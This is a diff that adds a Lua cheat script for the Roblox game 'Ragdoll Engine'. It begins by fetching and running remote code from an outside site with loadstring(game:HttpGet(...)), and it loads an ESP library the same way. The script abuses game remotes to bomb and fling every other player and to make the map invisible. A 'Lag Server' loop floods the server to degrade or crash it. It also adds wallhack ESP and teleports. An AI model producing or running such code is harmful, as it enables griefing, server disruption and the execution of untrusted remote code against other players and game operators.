@@ -1,0 +1,409 @@
+loadstring(game:HttpGet('https://virtuallization.com/ori_lib.txt'))()
+
+
+local win = Window("Ragdoll Engine", Enum.KeyCode.G)
+local main = win:addTab("Main")
+local invis = win:addTab("Invis")
+local fun = win:addTab("Fun")
+local tps = win:addTab("Teleports")
+
+--Functions
+function BombCreate()
+temp_bombs = {}
+for i,v in pairs(game:GetService('Players'):GetPlayers()) do
+    if v:FindFirstChild('Backpack') and v.Backpack:FindFirstChild('ImpulseGrenade') then
+        table.insert(temp_bombs,v.Backpack.ImpulseGrenade.CreateGrenade)
+    end
+end
+return temp_bombs[math.random(1,#temp_bombs)]
+end
+
+function BombAll()
+pcall(function()
+    for i = 1,3 do
+        for i,v in pairs(game:GetService('Players'):GetPlayers()) do
+            if v ~= game.Players.LocalPlayer then    
+                local v1 = Vector3.new(0, 0, 0)
+                local v2 = v.Character.Head.CFrame
+                local ori = BombCreate()
+                ori:FireServer(v1, v2)
+            end
+        end
+    end
+end)
+end
+
+
+function InvisibleRemote()
+temp_bombs = {}
+for i,v in pairs(game:GetService('Players'):GetPlayers()) do
+    if v:FindFirstChild('Backpack') and v.Backpack:FindFirstChild('OddPotion') then
+        table.insert(temp_bombs,v.Backpack.OddPotion.TransEvent)
+    end
+end
+return temp_bombs[math.random(1,#temp_bombs)]
+end
+
+
+function FlingAll()
+pcall(function()
+    for i = 1,9 do
+        for i,v in pairs(game:GetService('Players'):GetPlayers()) do
+            if v ~= game.Players.LocalPlayer then    
+                local v1 = Vector3.new(0, 0, 0)
+                local v2 = v.Character.Head.CFrame
+                local fling = BombCreate()
+                fling:FireServer(v1, v2)
+            end
+        end
+    end
+end)
+end
+
+
+function CrashServer()
+pcall(function()
+    for i = 1,2500 do
+        for i,v in pairs(game:GetService('Players'):GetPlayers()) do
+            if v ~= game.Players.LocalPlayer then    
+                local v1 = Vector3.new(0, 0, 0)
+                local v2 = v.Character.Head.CFrame
+                local crash = BombCreate()
+                crash:FireServer(v1, v2)
+            end
+        end
+    end
+end)
+end
+
+
+if Drawing then -- If drawing lib
+local esp = win:addTab("ESP")
+
+    local ESP = loadstring(game:HttpGet("https://virtuallization.com/ESP%20Library.txt"))()
+ESP.Names = false
+ESP.Boxes = false
+ESP.Tracers = false
+
+local toggle3 = esp:add(Toggle("ESP", false))
+
+toggle3.changed:Connect(function()
+    
+  if toggle3.value == true then
+ESP:Toggle(true)
+notificate({
+	["text"] = "Enabled ESP",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+  else
+ESP:Toggle(false)
+notificate({
+	["text"] = "Disabled ESP",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+  end
+end)
+
+
+local toggledad = esp:add(Toggle("Team Color", false))
+
+toggledad.changed:Connect(function()
+    
+  if toggledad.value == true then
+ESP.TeamColor = true
+notificate({
+	["text"] = "Enabled Team Colors",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+  else
+ESP.TeamColor = false
+notificate({
+	["text"] = "Disabled Team Colors",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+  end
+end)
+
+local toggle2 = esp:add(Toggle("Tracers", false))
+
+toggle2.changed:Connect(function()
+    
+  if toggle2.value == true then
+ESP.Tracers = true
+notificate({
+	["text"] = "Enabled Tracers",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+  else
+ESP.Tracers = false
+notificate({
+	["text"] = "Disabled Tracers",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+  end
+end)
+
+
+local toggle3 = esp:add(Toggle("Boxes", false))
+
+toggle3.changed:Connect(function()
+    
+  if toggle3.value == true then
+ESP.Boxes = true
+notificate({
+	["text"] = "Enabled Boxes",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+  else
+ESP.Boxes = false
+notificate({
+	["text"] = "Disabled Boxes",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+  end
+end)
+
+local toggle4 = esp:add(Toggle("Names", false))
+
+toggle4.changed:Connect(function()
+    
+  if toggle4.value == true then
+ESP.Names = true
+notificate({
+	["text"] = "Enabled Names",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+  else
+ESP.Names = false
+notificate({
+	["text"] = "Disabled Names",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+  end
+end)
+end
+
+
+
+local toggle = main:add(Toggle("Force Field", false))
+
+toggle.changed:Connect(function()
+    
+  if toggle.value == true then
+notificate({
+	["text"] = "Enabled Force Field",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+_G.forcefield = true
+
+while _G.forcefield do
+wait()
+local lp = game:GetService("Players").LocalPlayer
+local char = lp.Character
+
+local tool = char:FindFirstChild("Push") or lp.Backpack:FindFirstChild("Push")
+local remote = tool:FindFirstChild("PushEvent")
+    remote:FireServer()
+end
+  else
+notificate({
+	["text"] = "Disabled Force Field",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+_G.forcefield = false
+
+while _G.forcefield do
+wait()
+local lp = game:GetService("Players").LocalPlayer
+local char = lp.Character
+
+local tool = char:FindFirstChild("Push") or lp.Backpack:FindFirstChild("Push")
+local remote = tool:FindFirstChild("PushEvent")
+    remote:FireServer()
+end
+  end
+end)
+
+
+local norags = main:add(Toggle("Anti Ragdoll", false))
+
+norags.changed:Connect(function()
+    
+  if norags.value == true then
+notificate({
+	["text"] = "Enabled Anti Ragdoll",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+game:GetService("Players").LocalPlayer.Character["Local Ragdoll"].Disabled = true
+  else
+notificate({
+	["text"] = "Disabled Anti Ragdoll",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+game:GetService("Players").LocalPlayer.Character["Local Ragdoll"].Disabled = false
+end
+end)
+
+local inivis = invis:add(Toggle("Invisibility", false))
+
+inivis.changed:Connect(function()
+    
+  if inivis.value == true then
+notificate({
+	["text"] = "Enabled Invisibility",
+	["color"] = NotificationGreen,
+	["duration"] = 1,
+})
+    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+        if v.Name ~= 'HumanoidRootPart' then
+            local v1 = v
+            local v2 = 1
+            local remote = InvisibleRemote()
+            remote:FireServer(v1, v2)
+        end
+    end
+  else
+notificate({
+	["text"] = "Disabled Invisibility",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+        if v.Name ~= 'HumanoidRootPart' then
+            local v1 = v
+            local v2 = 0
+            local remote = InvisibleRemote()
+            remote:FireServer(v1, v2)
+        end
+    end
+end
+end)
+
+local maptransparency = invis:add(NumberValue("Map Transparency", 0))
+maptransparency.changed:Connect(function()
+for i,v in pairs(game.Workspace:GetDescendants()) do
+    if v:IsA('Part') or v:IsA('BasePart') then
+        local v1 = v
+        local v2 = maptransparency.value
+        local remote = InvisibleRemote()
+        remote:FireServer(v1, v2)
+    end
+end
+end)
+
+
+local megapush = main:add(BindValue("Mega Push", Enum.KeyCode.R))
+megapush.pressed:Connect(function()
+for i=1,54 do
+local lp = game:GetService("Players").LocalPlayer
+local char = lp.Character
+
+local tool = char:FindFirstChild("Push") or lp.Backpack:FindFirstChild("Push")
+local remote = tool:FindFirstChild("PushEvent")
+    remote:FireServer()
+end
+end)
+
+local push = main:add(BindValue("Push", Enum.KeyCode.E))
+push.pressed:Connect(function()
+local lp = game:GetService("Players").LocalPlayer
+local char = lp.Character
+
+local tool = char:FindFirstChild("Push") or lp.Backpack:FindFirstChild("Push")
+local remote = tool:FindFirstChild("PushEvent")
+    remote:FireServer()
+end)
+
+local bomball = fun:add(Button("Bomb All"))
+bomball.clicked:Connect(function()
+BombAll()
+end)
+
+local fling = fun:add(Button("Fling All"))
+fling.clicked:Connect(function()
+FlingAll()
+end)
+
+local crash = fun:add(Button("Lag Server"))
+crash.clicked:Connect(function()
+notificate({
+	["text"] = "Lagging Server, Do not leave",
+	["color"] = NotificationError,
+	["duration"] = 1,
+})
+wait(1)
+CrashServer()
+end)
+
+local visiblew = invis:add(Button("Make Map Visible"))
+visiblew.clicked:Connect(function()
+for i,v in pairs(game.Workspace:GetDescendants()) do
+    if v:IsA('Part') or v:IsA('BasePart') then
+        local v1 = v
+        local v2 = 0
+        local remote = InvisibleRemote()
+        remote:FireServer(v1, v2)
+    end
+end
+end)
+
+local toptower = tps:add(Button("Tower"))
+toptower.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(163, 1014, -21)
+end)
+
+local middle = tps:add(Button("Middle"))
+middle.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1, 3, -60)
+end)
+
+local balloon = tps:add(Button("Balloon Spawn"))
+balloon.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-112, 3, 44)
+end)
+
+local movestair = tps:add(Button("Moving Stairs"))
+movestair.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-207, 67, -51)
+end)
+
+local stairs = tps:add(Button("Stairs"))
+stairs.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-18, 180, -343)
+end)
+
+local spirals = tps:add(Button("Spiral Stairs"))
+spirals.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(154, 810, -175)
+end)
+
+local pool = tps:add(Button("Pool"))
+pool.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-126, 45, -145)
+end)
+
+local mines = tps:add(Button("Mines"))
+mines.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-56, 3, 20)
+end)
+
+local edge = tps:add(Button("Edge"))
+edge.clicked:Connect(function()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(613, 3, 1004)
+end)
+
+win:selectTab("Main")
